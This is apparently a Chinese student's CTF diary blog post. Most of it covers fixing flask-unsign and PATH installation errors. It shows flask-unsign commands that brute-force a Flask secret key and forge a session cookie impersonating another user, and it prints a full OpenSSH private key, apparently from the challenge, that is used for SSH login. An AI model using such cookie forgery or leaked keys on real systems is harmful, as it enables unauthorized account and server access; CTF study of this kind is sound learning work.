+<p>&#x611F;&#x89C9;&#x5C31;&#x662F;&#x6628;&#x5929;&#x7684;&#x955C;&#x50CF;&#x6CA1;&#x5F04;&#x5BF9;&#x5BFC;&#x81F4;&#x73B0;&#x5728;&#x5565;&#x4E5F;&#x4E0D;&#x662F;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321133831852.png" alt="image-20220321133831852" style="zoom:50%;">
+
+<p>&#x554A;&#x611F;&#x52A8;&#xFF0C;&#x8FD8;&#x597D;&#x4E4B;&#x524D;&#x5B58;&#x4E86;&#x5FEB;&#x7167;</p>
+<p>&#x55EF;&#xFF0C;&#x73B0;&#x5728;&#x53D1;&#x73B0;flask-unsign not found&#xFF0C;&#x636E;&#x8BF4;&#x662F;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x6CA1;&#x5F04;&#x5BF9;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321145927532.png" alt="image-20220321145927532" style="zoom:50%;">
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&lt;&#x4F60;&#x8981;&#x52A0;&#x5165;&#x7684;&#x8DEF;&#x5F84;&gt;:$PATH</span><br><span class="line">export PATH=&lt;/home/wsq/.local/bin&gt;:$PATH</span><br><span class="line">export PATH=&lt;/home/wsq/.local/bin&gt;:$PATH</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x597D;&#x7684;&#xFF0C;Linux&#x4E0B;&#x6211;&#x641E;&#x4E0D;&#x5B9A;&#xFF0C;&#x73B0;&#x5728;&#x8F6C;&#x6218;Windows</p>
+<p>&#x7ED3;&#x679C;Windows&#x4E0B;&#x8F7D;&#x4E5F;&#x5931;&#x8D25;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING: Failed to write executable - trying to use .deleteme logic</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Exception:</span><br><span class="line">Traceback (most recent call last):</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x7136;&#x540E;&#x53C8;&#x662F;&#x4E0A;&#x9762;&#x7684;&#x62A5;&#x9519;&#xFF0C;&#x4EBA;&#x9EBB;&#x4E86;</p>
+<p>&#x53EB;&#x6211;&#x66F4;&#x65B0;pip&#x7ED3;&#x679C;&#x53C8;&#x66F4;&#x65B0;&#x4E0D;&#x8D77;&#x3002;&#x3002;</p>
+<p>&#x554A;pip&#x53EF;&#x4EE5;&#x66F4;&#x65B0;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x662F;&#x5728;Python 3.7.5 &#x771F;&#x5947;&#x602A;</p>
+<p>[&#x8D34;&#x4E00;&#x6761;&#x597D;&#x4E0D;&#x5BB9;&#x6613;&#x6CA1;&#x6709;&#x62A5;&#x9519;&#x7684;&#x535A;&#x5BA2;&#x7ED9;&#x7684;&#x6307;&#x4EE4;](easy_install -i <a target="_blank" rel="noopener" href="https://pypi.doubanio.com/simple/">https://pypi.doubanio.com/simple/</a> &#x2013;upgrade pip)</p>
+<p>&#x518D;&#x6765;&#x4E00;&#x5F20;&#x56FE;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321153129211.png" alt="image-20220321153129211" style="zoom:50%;">
+
+<p>&#x6CA1;&#x7528;</p>
+<p>&#x6709;&#x4E0B;&#x9762;&#x90A3;&#x6761;&#x62A5;&#x9519;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Could not install packages due to an OSError: [WinError 5] &#x62D2;&#x7EDD;&#x8BBF;&#x95EE;&#x3002;: &apos;c:\\python310\\lib\\site-packages\\pip-21.2.3.dist-info\\entry_points.txt&apos;</span><br><span class="line">Consider using the `--user` option or check the permissions.</span><br></pre></td></tr></table></div></figure>
+
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321155740611.png" alt="image-20220321155740611" style="zoom:50%;">
+
+<p>&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;</p>
+<p>3.22&#x51CC;&#x6668;&#x597D;&#x4E86;&#xFF0C;&#x624B;&#x52A8;&#x5B89;&#x88C5;&#x597D;&#x4E86;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220322003126252.png" alt="image-20220322003126252" style="zoom:50%;">
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --decode --cookie=&apos;eyJ1c2VybmFtZSI6InJhcmFyYSJ9.YjgEUw.Ac40p0NBRzAxK0tqGF7hhKtmQvo&apos;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="Web-CyberStreak-v1-0-&#x7EED;-3-23">
+          <a href="#Web-CyberStreak-v1-0-&#x7EED;-3-23" class="heading-link"><i class="undefined"></i></a><a href="#Web-CyberStreak-v1-0-&#x7EED;-3-23" class="headerlink" title="Web CyberStreak v1.0 &#x7EED; 3.23"></a>Web CyberStreak v1.0 &#x7EED; 3.23</h1>
+      <img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323125208011.png" alt="image-20220323125208011" style="zoom:50%;">
+
+<p>&#x5C31;&#x662F;&#x8981;&#x8BBE;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF01;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/wsq/.local/bin &#x73AF;&#x5883;&#x53D8;&#x91CF;</span><br></pre></td></tr></table></div></figure>
+
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323130628608.png" alt="image-20220323130628608" style="zoom:50%;">
+
+<p>&#x4F7F;&#x7528;&#x7684;&#x662F;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/home/wsq/.local/bin</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x4E0A;&#x9762;&#x8FD9;&#x4E2A;&#x6307;&#x4EE4;</p>
+<p>&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;</p>
+<ul>
+<li>&#x751F;&#x6548;&#x65F6;&#x95F4;&#xFF1A;&#x7ACB;&#x5373;&#x751F;&#x6548;</li>
+<li>&#x751F;&#x6548;&#x671F;&#x9650;&#xFF1A;&#x5F53;&#x524D;&#x7EC8;&#x7AEF;&#x6709;&#x6548;&#xFF0C;&#x7A97;&#x53E3;&#x5173;&#x95ED;&#x540E;&#x65E0;&#x6548;</li>
+<li>&#x751F;&#x6548;&#x8303;&#x56F4;&#xFF1A;&#x4EC5;&#x5BF9;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6709;&#x6548;</li>
+<li>&#x914D;&#x7F6E;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E2D;&#x4E0D;&#x8981;&#x5FD8;&#x4E86;&#x52A0;&#x4E0A;&#x539F;&#x6765;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x5373;<code>$PATH</code>&#x90E8;&#x5206;&#xFF0C;&#x907F;&#x514D;&#x8986;&#x76D6;&#x539F;&#x6765;&#x914D;&#x7F6E;</li>
+</ul>
+<p>&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323131201964.png" alt="image-20220323131201964" style="zoom:50%;">
+
+<p>&#x8FD9;&#x4E00;&#x6B65;&#x662F;&#x7206;&#x7834;flask&#x7684;secret key &#x53D1;&#x73B0;&#x7206;&#x7834;&#x6210;&#x529F;.key&#x4E3A; s3cr3t</p>
+<p>&#x8F93;&#x5165;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;{&apos;username&apos;:&apos;xXx-michel-xXx&apos;}&quot; --secret &apos;s3cr3t&apos;</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x4F2A;&#x9020;cookie</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6InhYeC1taWNoZWwteFh4In0.YjqtYQ.nUc9UMvzLkaLN8cZPXBC4Qj4YK4</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x4E0A;&#x9762;&#x662F;&#x4F2A;&#x9020;&#x7684;cookie</p>
+<p>&#x7136;&#x540E;&#x4F7F;&#x7528;cookie editor&#x4FEE;&#x6539;cookie&#xFF0C;&#x6211;&#x662F;&#x76F4;&#x63A5;&#x5C06;session&#x5904;&#x7684;cookie&#x6539;&#x4E3A;&#x4F2A;&#x9020;&#x7684;cookie</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323132438364.png" alt="image-20220323132438364" style="zoom:50%;">
+
+<p>&#x4E0D;&#x8FC7;&#x5FD8;&#x8BB0;&#x4E86;xXx-michel-xXx&#x662F;&#x4ECE;&#x54EA;&#x91CC;&#x5F97;&#x5230;&#x7684;&#x4FE1;&#x606F;&#x4E86;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323132756324.png" alt="image-20220323132756324" style="zoom:33%;">
+
+<p>&#x54E6;&#xFF0C;&#x662F;&#x9898;&#x76EE;&#x4E2D;&#x7ED9;&#x51FA;&#x7684;</p>
+
+        <h1 id="pentest-part1&#x7EED;-3-23">
+          <a href="#pentest-part1&#x7EED;-3-23" class="heading-link"><i class="undefined"></i></a><a href="#pentest-part1&#x7EED;-3-23" class="headerlink" title="pentest part1&#x7EED; 3.23"></a>pentest part1&#x7EED; 3.23</h1>
+      <p>&#x91CD;&#x65B0;&#x4ECE;&#x79C1;&#x94A5;&#x767B;&#x5F55;&#x8FD9;&#x4E00;&#x6B65;&#x5F00;&#x59CB;</p>
+<p>&#x6211;&#x4F7F;&#x7528;&#x4E86;12&#x6708;&#x7684;&#x4E00;&#x4E2A;&#x5FEB;&#x7167;&#xFF0C;&#x6253;&#x5F00;&#x4E86;ssh&#x670D;&#x52A1;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x684C;&#x9762;&#x65B0;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x540E;&#x6765;&#x53C8;&#x7528;ssh</p>
+<p>&#x7684;&#x6307;&#x4EE4;&#x8F93;&#x8FDB;&#x53BB;&#xFF0C;&#x5F97;&#x5230;&#x4E86;&#x548C;&#x5C0F;&#x4F19;&#x4F34;&#x7684;&#x4E00;&#x6837;&#x7684;&#x6709;fingerprint&#x7684;&#x56DE;&#x663E;&#xFF0C;&#x4F46;&#x662F;&#x540E;&#x6765;&#x53C8;&#x53EB;&#x6211;&#x8F93;&#x5165;&#x5BC6;&#x7801;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323134207867.png" alt="image-20220323134207867" style="zoom:50%;">
+
+
+        <h2 id="3-24-&#x6211;&#x53C8;&#x56DE;&#x6765;&#x4E86;">
+          <a href="#3-24-&#x6211;&#x53C8;&#x56DE;&#x6765;&#x4E86;" class="heading-link"><i class="undefined"></i></a><a href="#3-24-&#x6211;&#x53C8;&#x56DE;&#x6765;&#x4E86;" class="headerlink" title="3.24 &#x6211;&#x53C8;&#x56DE;&#x6765;&#x4E86;"></a>3.24 &#x6211;&#x53C8;&#x56DE;&#x6765;&#x4E86;</h2>
+      <p>however ,nothing was solved&#x2026;</p>
+<p>&#x73B0;&#x5728;&#x8FD8;&#x662F;&#x7528;&#x7684;&#x5341;&#x4E8C;&#x6708;&#x4EFD;&#x7684;&#x5FEB;&#x7167;&#xFF0C;&#x5728;&#x5B89;&#x88C5;ssh &#x670D;&#x52A1;&#x65F6;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x51FA;&#x73B0;&#x4E86;&#x4E0B;&#x9762;&#x7684;&#x62A5;&#x9519;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x7F51;&#x4E0A;&#x8BF4;&#x5173;&#x95ED;apt&#x8FDB;&#x7A0B;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#xFF0C;&#x540E;&#x6765;&#x627E;&#x5230;&#x4E00;&#x6559;&#x7A0B;&#x8BF4;&#x8FD8;&#x9700;&#x8981;&#x5220;&#x9664;&#x9501;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x2014;&#x2014;</p>
+<p><a href="%5B(28%E6%9D%A1%E6%B6%88%E6%81%AF">&#x8FD9;&#x662F;&#x6559;&#x7A0B;</a> Ubuntu&#x4E2D;Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend)&#x95EE;&#x9898;&#x7684;&#x89E3;&#x51B3;_&#x6731;&#x53C8;&#x7096;&#x7C89;&#x6761;&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_dpkg frontend lock](<a target="_blank" rel="noopener" href="https://blog.csdn.net/shimadear/article/details/90598646">https://blog.csdn.net/shimadear/article/details/90598646</a>))</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220324105652419.png" alt="image-20220324105652419" style="zoom:50%;">
+
+<p>&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x5B89;&#x88C5;ssh&#x4E86;&#xFF08;&#x6211;&#x600E;&#x4E48;&#x611F;&#x89C9;&#x8981;&#x662F;&#x4E0D;&#x7CFB;&#x7EDF;&#x7684;&#x5B66;&#x4E60;Linux&#x4ECA;&#x540E;&#x6211;&#x4F1A;&#x5728;&#x8FD9;&#x4E2A;&#x4E0A;&#x9762;&#x8017;&#x8D39;&#x5F88;&#x591A;&#x65F6;&#x95F4;&#x3002;&#x3002;&#x771F;&#x7684;&#x6709;&#x597D;&#x591A;&#x62A5;&#x9519;&#x3002;&#x3002;&#xFF09;</p>
+
+        <h2 id="3-25">
+          <a href="#3-25" class="heading-link"><i class="undefined"></i></a><a href="#3-25" class="headerlink" title="3.25"></a>3.25</h2>
+      
+        <h3 id="&#x79C1;&#x94A5;">
+          <a href="#&#x79C1;&#x94A5;" class="heading-link"><i class="undefined"></i></a><a href="#&#x79C1;&#x94A5;" class="headerlink" title="&#x79C1;&#x94A5;"></a>&#x79C1;&#x94A5;</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEA3TIqLP319AZbwx2ZbFewWwbPgAB7XiPfxUPc5EcB0hUSrSnr7l0X</span><br><span class="line">Ymf1FGPdoC72jhtC8pzqJ8mcCExVQxCUBxHzIIbmU1Y9Fl9Nz+CpQ+P6piZB+hw9uWPFGw</span><br><span class="line">XHzV97kOcWTDGNZ8j+c9h55Rr9sCM/uTI99elhCs0C9fwfI0C9kGGpFBoDi9s3A/X+ewC+</span><br><span class="line">ii4vVXfXGaC+7yDL6mfTfA1xyyJbqEbO3geQTyNwqF0b4bsPoV+IN+ZLI25uobggwvfEAH</span><br><span class="line">hneuQDx4dt9FQHHhd9LX1VPBnhSRAO8hqFKvBkOAHIYitT/bFdPZb71kH/il8fxUiVnBqm</span><br><span class="line">GBp+rK1akqEzwDwsASOIhllDBd+0MWHK80d7XWsTQ1Bfyl8i7vDadJW34Fb53nYdGe0+Ot</span><br><span class="line">94sO7FVJwK1EHbq1rNxuF51+CNOvF6AtP3Q9GZldzmyAEDteVEQW6waS63CDCzUVBPrBM+</span><br><span class="line">t8r17/J3g0y0ooSkujrjpAdV1w6kudzgFFsOHiRhAAAFiDaUbzw2lG88AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAN0yKiz99fQGW8MdmWxXsFsGz4AAe14j38VD3ORHAdIVEq0p6+5dF2Jn9RRj3aAu</span><br><span class="line">9o4bQvKc6ifJnAhMVUMQlAcR8yCG5lNWPRZfTc/gqUPj+qYmQfocPbljxRsFx81fe5DnFk</span><br><span class="line">wxjWfI/nPYeeUa/bAjP7kyPfXpYQrNAvX8HyNAvZBhqRQaA4vbNwP1/nsAvoouL1V31xmg</span><br><span class="line">vu8gy+pn03wNccsiW6hGzt4HkE8jcKhdG+G7D6FfiDfmSyNubqG4IML3xAB4Z3rkA8eHbf</span><br><span class="line">RUBx4XfS19VTwZ4UkQDvIahSrwZDgByGIrU/2xXT2W+9ZB/4pfH8VIlZwaphgafqytWpKh</span><br><span class="line">M8A8LAEjiIZZQwXftDFhyvNHe11rE0NQX8pfIu7w2nSVt+BW+d52HRntPjrfeLDuxVScCt</span><br><span class="line">RB26tazcbhedfgjTrxegLT90PRmZXc5sgBA7XlREFusGkutwgws1FQT6wTPrfK9e/yd4NM</span><br><span class="line">tKKEpLo646QHVdcOpLnc4BRbDh4kYQAAAAMBAAEAAAGAWPthNBBF7RDRwUAbBBaSf0vSFX</span><br><span class="line">AcMNbFohmWts5J0TVg+gAvRQh168ReNwGlmlbKIIie+fJdz/uupTfv5La6lc2GvMMHzOaY</span><br><span class="line">VHOqXcHG1eTUZBpn2DGcMwQLur8sjVWn47bSpXwZonKcygV/o8aj30OO0vV/L3ne6/VlB4</span><br><span class="line">eRDyFwILDoz4lXe9+H1jQTV3AJNpU1vXAkO88KgC/1WCrETNcru8fqj1tMxMzOJMfg/hnW</span><br><span class="line">qYwS0ZwYtEQUXgCCyNPEuqlaJjabbZz7UxmeCFc56aphWyAmWnq66DPPzpEXkGTZNtH3vc</span><br><span class="line">3eY0dmUQ5gDE7fV/naFNDbCQEGP80Mr77aGfeU575xlxL9hCC7XNZQRpqLqwIxXu++jJj3</span><br><span class="line">P+gWrqWPegME7BgxpjJHiYHLUBCcB1M3TTL9HGH3khw/fp3gWJlZBfDBXu8i1PIRhdTjS6</span><br><span class="line">27zgpDBJi+NzdL7inbdVrvYMpwcZvO4SViwv4IKcpI2Tlrf7rQByPpW70jSHjhVkABAAAA</span><br><span class="line">wGZ++/+vISiIVUTPl8zBQT2a2i9QunsT10d0gwKDaZZa4M/07GVWffhL2OLueBBUBiqe7U</span><br><span class="line">FjSTgfFkAW+f7H8o0ODXyp7TIb5Nv2pjfr29XyXPOHBtwb263hFGWLAFw4BU7cNZUrTWT9</span><br><span class="line">T2+dRDiuEEwITFfoqh+yPkS/gBvMcFiBCRYGku/Tz5h2BQK3KY1MOYNrtmtjJOEgtbPTcp</span><br><span class="line">8SM/kehNbY5rWECa2to5T14NVA/tZmJ7MTuatFJtxqqJeVwAAAAMEA8zj2kSyC/3oFUBkN</span><br><span class="line">JZ/xlGJyXjyq4XcZIRt809KvdAY8x3MKOP0/LiSayqK9HUzp+3S55tVo+L1yKXVf0TBVGn</span><br><span class="line">cHe6k+uCf0jSp3985COpAnfTkM5sQuxhmhXXZO5nJjwQDfS2bX60kkEkYZGEiujIK2cTMp</span><br><span class="line">CY9OXy/iVTuVZWofN9BODtb739eJLHi/w4WhHiEmFWi4c6+1dt1uu3hpjAwRRDk3fio6Jg</span><br><span class="line">CY8z98TGN8gw4LYoMLiweXcqMGSOaBAAAAwQDo0Pjc79LikkNKrWflc7P2CA362zLkloiV</span><br><span class="line">f7zIAaD0R3kWGu7yefl0pRjngjyFdwKdeCWjncjCoWAz57Bi5Fvh34giDP2fUf5AH4ifMz</span><br><span class="line">nUiKxhJFWERjQIJvnX7CS3x8ZKYE4BmpaQ1NN5DiSctJRjHlnY3JECSaSt0Lc2ynOhGBHP</span><br><span class="line">m/49jD+sBJDl7i6MELuyKGUHXCENkBDHc7kdkaDzxUqe1eelNHOBQZcpUroCYrfKQjKMlp</span><br><span class="line">/T/78KtD7XDeEAAAARbGVvbmFyZG9AcGxheWxpc3QBAg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>&#x95EE;&#x9898;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x611F;&#x8C22;&#x5404;&#x4F4D;&#x5927;&#x4F6C;&#x7684;&#x9F0E;&#x529B;&#x76F8;&#x52A9;&#xFF01;&#xFF01;</p>
+<p>&#x539F;&#x56E0;&#x5927;&#x6982;&#x662F;&#x5728;&#x4E8E;&#xFF1A;&#x5EFA;&#x7ACB;&#x79C1;&#x94A5;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x6587;&#x4EF6;&#x547D;&#x540D;&#x4E0D;&#x5E94;&#x8BE5;&#x7528;.\   &#x8FD9;&#x4E2A;&#x8868;&#x793A;&#x666E;&#x901A;&#x7528;&#x6237;&#x7684;&#x8DEF;&#x5F84;&#xFF1F;&#x5F53;&#x4FDD;&#x5B58;&#x65F6;&#x5E94;&#x8BE5;&#x5C06;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x5728;&#x684C;&#x9762;&#xFF0C;&#x547D;&#x540D;&#x4E3A;id_rsa.txt</p>
+<p>&#x4E4B;&#x540E;&#x518D;&#x6309;&#x7167;&#x4E4B;&#x524D;&#x7684;&#x6307;&#x4EE4;ssh&#x6765;&#x8868;&#x793A;&#x5C31;&#x597D;&#x4E86;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220325204153453.png" alt="image-20220325204153453" style="zoom:50%;">
+
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220325204244366.png" alt="image-20220325204244366" style="zoom:50%;">
+
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220325204322882.png" alt="image-20220325204322882" style="zoom:50%;">
+
+<p>&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;</p>
+<p>&#x4E0B;&#x9762;&#x662F;&#x4E2A;&#x5C0F;&#x8BD5;&#x9A8C;&#xFF08;&#x6709;&#x9053;&#x4E91;&#x767D;&#x5AD6;&#x5916;&#x94FE;&#xFF09;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/WEB839b9c3714ade2eb01f0d039961f4399-16482129494003" alt="1" style="zoom:50%;">
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">Kirsten Carton</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/">http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/pentest/">pentest</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/03/20/some-fragmentire/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">some fragmentire</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/03/17/error/"><span class="paginator-prev__text">error</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dvctf"><span class="toc-number">1.</span> <span class="toc-text">
+          dvctf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">1.1.</span> <span class="toc-text">
+          reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mine-game"><span class="toc-number">1.1.1.</span> <span class="toc-text">
+          mine game</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.2.</span> <span class="toc-text">
+          web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">
+          渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-music"><span class="toc-number">1.4.</span> <span class="toc-text">
+          web music</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%8F%E5%8E%86"><span class="toc-number">2.</span> <span class="toc-text">
+          复现经历</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pentest-part1"><span class="toc-number">2.1.</span> <span class="toc-text">
+          pentest part1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%98%AF%E7%A7%81%E9%92%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">
+          这里是私钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%98%AF%E6%8C%87%E4%BB%A4"><span class="toc-number">2.1.2.</span> <span class="toc-text">
+          这里是指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-CyberStreak-v1-0"><span class="toc-number">2.2.</span> <span class="toc-text">
+          Web CyberStreak v1.0</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#error-about-Linux"><span class="toc-number">3.</span> <span class="toc-text">
+          error about Linux</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-CyberStreak-v1-0-%E7%BB%AD-3-23"><span class="toc-number">4.</span> <span class="toc-text">
+          Web CyberStreak v1.0 续 3.23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pentest-part1%E7%BB%AD-3-23"><span class="toc-number">5.</span> <span class="toc-text">
+          pentest part1续 3.23</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-24-%E6%88%91%E5%8F%88%E5%9B%9E%E6%9D%A5%E4%BA%86"><span class="toc-number">5.1.</span> <span class="toc-text">
+          3.24 我又回来了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-25"><span class="toc-number">5.2.</span> <span class="toc-text">
+          3.25</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%81%E9%92%A5"><span class="toc-number">5.2.1.</span> <span class="toc-text">
